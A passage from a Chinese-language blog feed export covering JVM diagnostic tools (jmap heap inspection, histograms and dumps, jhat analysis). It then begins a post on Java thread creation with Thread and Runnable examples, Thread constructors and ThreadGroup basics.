<td><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424175043646-1682329849562-24.png" alt="image-20230424175043646"> <br><br>Compiled：被执行的编译任务的数量<br>Size：方法字节码的字节数<br>Type：编译类型<br>Method：编译方法的类名和方法名。类名使用”/” 代替 “.” 作为空间分隔符. 方法名是给出类的方法名. 格式是一致于HotSpot – XX:+PrintComplation 选项</td>
</tr>
</tbody>
</table>
<h1>jmap</h1>
<blockquote>
<p>Java内存映像工具</p>
<p>jmap（Memory Map for Java）命令用于生成堆转储快照（一般称为heapdump或dump文件）。</p>
<p>如果不使用<strong>jmap</strong>命令，要想获取Java堆转储快照，还有一些比较“暴力”的手段：譬如加-XX：+HeapDumpOnOutOfMemoryError参数，可以让虚拟机在OOM异常出现之后自动生成dump文件，通过-XX：+HeapDumpOnCtrlBreak参数则可以使用[Ctrl]+[Break]键让虚拟机生成dump文件，又或者在Linux系统下通过Kill-3命令发送进程退出信号“吓唬”一下虚拟机，也能拿到dump文件。</p>
<p><strong>jmap</strong>的作用并不仅仅是为了获取dump文件，它还可以查询finalize执行队列、Java堆和永久代的详细信息，如空间使用率、当前用的是哪种收集器等。</p>
<p>和<strong>jinfo</strong>命令一样，<strong>jmap</strong>有不少功能在Windows平台下都是受限的，除了生成dump文件的**-dump**选项和用于查看每个类的实例、空间占用统计的-histo选项在所有操作系统都提供之外，其余选项都只能在Linux/Solaris下使用。</p>
</blockquote>
<p>命令格式<br>
<strong>jmap</strong> [option] <strong>LVMID</strong></p>
<p>option参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>dump</td>
<td>生成堆转储快照，格式为:    -dump:[live, ] format=b,file=<filename>,  <br>其中live子参数说明是否只dump出存活的对象。</filename></td>
</tr>
<tr>
<td>finalizerinfo</td>
<td>显示在F-Queue队列等待Finalizer线程执行finalizer方法的对象</td>
</tr>
<tr>
<td>heap</td>
<td>显示Java堆详细信息</td>
</tr>
<tr>
<td>histo</td>
<td>显示堆中对象的统计信息，GC使用的算法，heap的配置及wise heap的使用情况<br>可以用此来判断内存目前的使用情况以及垃圾回收情况</td>
</tr>
<tr>
<td>permstat</td>
<td>to print permanent generation statistics</td>
</tr>
<tr>
<td>F</td>
<td>当-dump没有响应时，强制生成dump快照</td>
</tr>
</tbody>
</table>
<h2 id="jmap-heap-28920：打印内存信息">jmap -heap 28920：打印内存信息</h2>
<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">C:\Users\Administrator&gt;jmap -heap 7676
Attaching to process ID 7676, please wait...
Debugger attached successfully.
Server compiler detected.
JVM version is 25.131-b11

using thread-local object allocation.
Parallel GC with 8 thread(s) # GC 方式

Heap Configuration: # 堆内存初始化配置
   MinHeapFreeRatio         = 0  # 对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40)
   MaxHeapFreeRatio         = 100 # 对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70)
   MaxHeapSize              = 8562671616 (8166.0MB) # 对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小
   NewSize                  = 178782208 (170.5MB) # 对应jvm启动参数-XX:NewSize=设置JVM堆的‘新生代’的默认大小
   MaxNewSize               = 2854223872 (2722.0MB) # 对应jvm启动参数-XX:MaxNewSize=设置JVM堆的‘新生代’的最大大小
   OldSize                  = 358088704 (341.5MB) # 对应jvm启动参数-XX:OldSize=&lt;value&gt;:设置JVM堆的‘老生代’的大小
   NewRatio                 = 2 # 对应jvm启动参数-XX:NewRatio=:‘新生代’和‘老生代’的大小比率
   SurvivorRatio            = 8 # 对应jvm启动参数-XX:SurvivorRatio=设置年轻代中Eden区与Survivor区的大小比值
   MetaspaceSize            = 21807104 (20.796875MB)
   CompressedClassSpaceSize = 1073741824 (1024.0MB)
   MaxMetaspaceSize         = 17592186044415 MB
   G1HeapRegionSize         = 0 (0.0MB)

Heap Usage: # 堆内存使用情况
PS Young Generation
Eden Space: # Eden区内存分布
   capacity = 2394423296 (2283.5MB) # Eden区总容量
   used     = 42456832 (40.489990234375MB) # Eden区已使用
   free     = 2351966464 (2243.010009765625MB) # Eden区剩余容量
   1.7731548164823736% used  # Eden区使用比率
From Space: # 其中一个Survivor区的内存分布
   capacity = 212336640 (202.5MB)
   used     = 0 (0.0MB)
   free     = 212336640 (202.5MB)
   0.0% used 
To Space: # 另一个Survivor区的内存分布
   capacity = 221773824 (211.5MB)
   used     = 0 (0.0MB)
   free     = 221773824 (211.5MB)
   0.0% used
PS Old Generation # 当前的Old区内存分布
   capacity = 1039138816 (991.0MB)
   used     = 487669936 (465.0782928466797MB)
   free     = 551468880 (525.9217071533203MB)
   46.93020109451864% used

49107 interned Strings occupying 4515704 bytes.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="jmap-histo-live-7676-more：打印堆的对象统计，包括对象数、内存大小等等">jmap -histo:live 7676| more：打印堆的对象统计，包括对象数、内存大小等等</h2>
<blockquote>
<p>因为在<strong>dump:live</strong>前会进行<strong>full gc</strong>，如果带上<strong>live</strong>则只统计活对象，因此不加<strong>live</strong>的堆大小要大于加<strong>live</strong>堆的大小</p>
</blockquote>
<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat"> num    #instances       #bytes  class name
----------------------------------------------
   1:       264504      133851  [C
   2:       266752       64020  java.lang.String
   3:       197556       63217  java.util.HashMap$Node
   4:         9794       54849  com.ssp.user.model.Userinfo
   5:        58254       36364  [Ljava.lang.Object;
   6:        11204       18546  [Ljava.util.HashMap$Node;
   7:        72959       17510  java.util.ArrayList
   8:         4897       13321  com.ssp.model.WareInfo
   9:        16716        8023  java.util.TreeMap
  10:        15798        7583  java.util.HashMap
  11:        17063        6825  java.util.TreeMap$Entry
  12:        11155        6247  java.util.LinkedHashMap
  13:        16706        5346  java.util.Collections$SynchronizedMap
  14:         5635        4959  java.lang.reflect.Method
  15:         4895        4699  com.ssp.index.model.DataAuthor
  16:          795        4262  [B
  17:        16694        4006  jeasy.analysis.Dictionary
  18:        16779        2684  java.lang.Character
  19:         8271        2646  java.util.concurrent.ConcurrentHashMap$Node
  20:          947        1737  [I
  21:         1336        1502  java.lang.Class
  22:         2658        1063  java.util.LinkedHashMap$Entry
  23:         2212        1062  org.aspectj.weaver.reflect.ShadowMatchImpl
  24:          432         899  com.ssp.model.report.Aport
  25:         5177         828  java.util.LinkedHashMap$LinkedKeySet
  26:         3658         820  [Ljava.lang.Class;
-- More  --<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xml <strong>class</strong> name是对象类型，说明如下：</p>
<table>
<thead>
<tr>
<th>显示</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>B</td>
<td>byte</td>
</tr>
<tr>
<td>C</td>
<td>char</td>
</tr>
<tr>
<td>D</td>
<td>double</td>
</tr>
<tr>
<td>F</td>
<td>float</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
</tr>
<tr>
<td>J</td>
<td>long</td>
</tr>
<tr>
<td>Z</td>
<td>boolean</td>
</tr>
<tr>
<td>[ 数组</td>
<td>如[I表示int[]</td>
</tr>
<tr>
<td>[L+类名</td>
<td>其他对象</td>
</tr>
</tbody>
</table>
<h2 id="jmap-finalizerinfo-7676：打印等待回收对象的信息">jmap -finalizerinfo 7676：打印等待回收对象的信息</h2>
<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">C:\Users\Administrator&gt;  jmap -finalizerinfo 7676
Attaching to process ID 7676, please wait...
Debugger attached successfully.
Server compiler detected.
JVM version is 25.131-b11
Number of objects pending for finalization: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到当前F-QUEUE队列中并没有等待Finalizer线程执行finalizer方法的对象。</p>
<h2 id="jmap-dump-live-format-b-file-dump-hprof-7676-提取MAT分析文件">jmap -dump:live,format=b,file=dump.hprof 7676 : 提取MAT分析文件</h2>
<p>dump.hprof 这个后缀是为了后续可以直接用MAT(Memory Anlysis Tool)打开。</p>
<h1>jhat：虚拟机堆转储快照分析工具</h1>
<p>jhat（JVM Heap Analysis Tool）命令与jmap搭配使用，来<strong>分析jmap生成的堆转储快照</strong>。</p>
<p>jhat内置了一个微型的HTTP/HTML服务器，生成dump文件的分析结果后，可以在浏览器中查看。</p>
<p>不过实事求是地说，在实际工作中，除非手上真的没有别的工具可用，否则一般都不会去直接使用jhat命令来分析dump文件，主要原因有二：</p>
<p>一是一般不会在部署应用程序的服务器上直接分析dump文件，即使可以这样做，也会尽量将dump文件复制到其他机器。</p>
<p>二是用于分析的机器一般也是服务器，由于加载dump快照文件需要比生成dump更大的内存，所以一般在64位JDK、大内存的服务器上进行分析，因为分析工作是一个耗时而且消耗硬件资源的过程，既然都要在其他机器进行，就没有必要受到命令行工具的限制了；</p>
<p>另一个原因是jhat的分析功能相对来说比较简陋，VisualVM，以及专业用于分析dump文件的Eclipse Memory Analyzer、IBM HeapAnalyzer等工具，都能实现比jhat更强大更专业的分析功能。</p>
<p>命令格式：  <strong>jhat</strong> [option] [dumpfile]</p>
<p>OPTION参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-stack false|true</td>
<td>默认值为 true<br>关闭对象分配调用栈跟踪(tracking object allocation call stack) <br>如果分配位置信息在堆转储中不可用，则必须将此标志设置为 false<br></td>
</tr>
<tr>
<td>-refs false|true</td>
<td>关闭对象引用跟踪(tracking of references to objects)。  默认值为 true。  <br>默认情况下, 返回的指针是指向其他特定对象的对象,如反向链接或输入引用(referrers or incoming references), 会统计/计算堆中的所有对象。</td>
</tr>
<tr>
<td>-port port-number</td>
<td>设置 jhat HTTP server 的端口号。  默认值 7000</td>
</tr>
<tr>
<td>-exclude exclude-file</td>
<td>指定对象查询时需要排除的数据成员列表文件(a file that lists data members that should be excluded from the reachable objects query)。 <br>例如, 如果文件列列出了 java.lang.String.value , 那么当从某个特定对象 Object o 计算可达的对象列表时, 引用路径涉及 java.lang.String.value 的都会被排除。</td>
</tr>
<tr>
<td>-baseline exclude-file</td>
<td>指定一个基准堆转储(baseline heap dump)。 <br>在两个 heap dumps 中有相同 object ID 的对象会被标记为不是新的(marked as not being new)<br>其他对象被标记为新的(new)。   在比较两个不同的堆转储时很有用</td>
</tr>
<tr>
<td>-debug int</td>
<td>设置 debug 级别. 0 表示不输出调试信息。 <br>值越大则表示输出更详细的 debug 信息。</td>
</tr>
<tr>
<td>-version</td>
<td>启动后只显示版本信息就退出</td>
</tr>
<tr>
<td>-J&lt; flag &gt;</td>
<td>因为 jhat 命令实际上会启动一个JVM来执行, 通过 -J 可以在启动JVM时传入一些启动参数。  <br>例如, -J-Xmx512m 则指定运行 jhat 的Java虚拟机使用的最大堆内存为 512 MB<br>如果需要使用多个JVM启动参数,则传入多个 -Jxxxxxx.</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>jhat dump.hprof</strong>：查看之前jmap生成的 <strong>dump.hprof</strong></p>
<pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">C:\Users\Administrator&gt;jhat dump.hprof
Reading from dump.hprof...
Dump file created Wed Apr 26 10:44:41 CST 2023
Snapshot read, resolving...
Resolving 185857 objects...
Chasing references, expect 37 dots.....................................
Eliminating duplicate references.....................................
Snapshot resolved.
Started HTTP server on port 7000
Server is ready.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>屏幕显示 <strong>Server is ready</strong>的提示后，用户在浏览器中键入http://localhost:7000/就可以看到分析结果</p>
<blockquote>
<p>分析结果默认是以包为单位进行分组显示。</p>
<p>分析内存泄漏问题主要会使用到其中的“Heap Histogram”（与jmap -histo功能一样）与OQL页签的功能。</p>
<p>前者可以找到内存中总容量最大的对象，后者是标准的对象查询语言，使用类似SQL的语法对内存中的对象进行查询统计</p>
</blockquote>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程基础</title>
    <url>/20221101/53471b9a.html</url>
    <content><![CDATA[<h2 id="Chapter1：快速认识线程">Chapter1：快速认识线程</h2>
<h3 id="继承Thread类创建线程类（模板设计模式）">继承Thread类创建线程类（模板设计模式）</h3>
<p>（1）定义Thread类的子类，并重写该类的run方法，该run方法的方法体就代表了线程要完成的任务。因此把run()方法称为执行体。</p>
<p>（2）创建Thread子类的实例，即创建了线程对象。</p>
<p>（3）调用线程对象的start()方法来启动该线程。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>
<span class="token comment">// 定义Thread类的子类，并重写该类的run方法</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TicketWindow</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">MAX</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">AtomicInteger</span> index <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">TicketWindow</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>index<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token constant">MAX</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"柜台："</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"当前的号码是："</span> <span class="token operator">+</span> index<span class="token punctuation">.</span><span class="token function">addAndGet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bankTest1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// step2：创建Thread子类的实例，即创建了线程对象</span>
  <span class="token class-name">TicketWindow</span> ticketWindow1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TicketWindow</span><span class="token punctuation">(</span><span class="token string">"一号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// step3: 调用线程对象的start()方法来启动该线程</span>
  ticketWindow1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">TicketWindow</span> ticketWindow2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TicketWindow</span><span class="token punctuation">(</span><span class="token string">"二号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">TicketWindow</span> ticketWindow3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TicketWindow</span><span class="token punctuation">(</span><span class="token string">"三号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">TicketWindow</span> ticketWindow4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TicketWindow</span><span class="token punctuation">(</span><span class="token string">"四号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow4<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="通过Runnable接口创建线程类（策略模式的应用）">通过Runnable接口创建线程类（策略模式的应用）</h3>
<p>为了将可执行的控制单元和线程控制分割开来</p>
<p>（1）定义runnable接口的实现类，并重写该接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。</p>
<p>（2）创建 Runnable实现类的实例，并依此实例作为Thread的target来创建Thread对象，该Thread对象才是真正的线程对象。</p>
<p>（3）调用线程对象的start()方法来启动该线程。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TickWindowRunnable</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">MAX</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;=</span> <span class="token constant">MAX</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"的号码是："</span> <span class="token operator">+</span> index<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bankTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token class-name">TickWindowRunnable</span> ticketWindowRunnable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TickWindowRunnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>ticketWindowRunnable<span class="token punctuation">,</span> <span class="token string">"一号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>ticketWindowRunnable<span class="token punctuation">,</span> <span class="token string">"二号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>ticketWindowRunnable<span class="token punctuation">,</span> <span class="token string">"三号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>ticketWindowRunnable<span class="token punctuation">,</span> <span class="token string">"四号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  ticketWindow1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow4<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">//java8改造</span>
 <span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bankTest3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">MAX</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
  <span class="token keyword">final</span> <span class="token class-name">AtomicInteger</span> index <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">final</span> <span class="token class-name">Runnable</span> runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>index<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token constant">MAX</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"的号码是："</span> <span class="token operator">+</span> index<span class="token punctuation">.</span><span class="token function">addAndGet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token class-name">Thread</span> ticketWindow1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"一号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"二号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"三号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">Thread</span> ticketWindow4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"四号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  ticketWindow1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ticketWindow4<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Chapter2：深入理解Thread的构造函数">Chapter2：深入理解Thread的构造函数</h2>
<table>
<thead>
<tr>
<th style="text-align:left">序号</th>
<th style="text-align:left">方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">Thread()</td>
<td>Allocates a new Thread object.</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">Thread(Runnable target)</td>
<td>Allocates a new Thread object.</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">Thread(Runnable target, String name)</td>
<td>Allocates a new Thread object.</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">Thread(String name)</td>
<td>Allocates a new Thread object.</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">Thread(ThreadGroup group, Runnable  target)</td>
<td>Allocates a new Thread object.</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">Thread(ThreadGroup group, Runnable  target, String name)</td>
<td>Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group.</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">Thread(ThreadGroup group, Runnable  target, String name, long stackSize)</td>
<td>Allocates a new Thread object so that it has target as its run object,  has the specified name as its name, and belongs to the thread group referred  to by group, and has the specified stack size.</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">Thread(ThreadGroup group, String  name)</td>
<td>Allocates a new Thread object.</td>
</tr>
</tbody>
</table>
<h3 id="Thread命名">Thread命名</h3>
<ol>
<li>
<p>默认线程名称，按照编号，从0开始递增。线程一旦启动，线程名不可再进行更改。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Thread-"</span> <span class="token operator">+</span> <span class="token function">nextThreadNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="Thread和ThreadGroup">Thread和ThreadGroup</h3>
<ol>
<li>main线程所在的ThreadGroup称为main</li>
<li>构造一个线程如果没有显示的指定ThreadGroup，他将和父线程在同一个ThreadGroup</li>
</ol>
<h3 id="Thread和stackSize">Thread和stackSize</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
* 测试默认栈深度 
*/</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestStack</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">recur</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        counter<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token function">recur</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归</span>
    <span class="token punctuation">}</span>

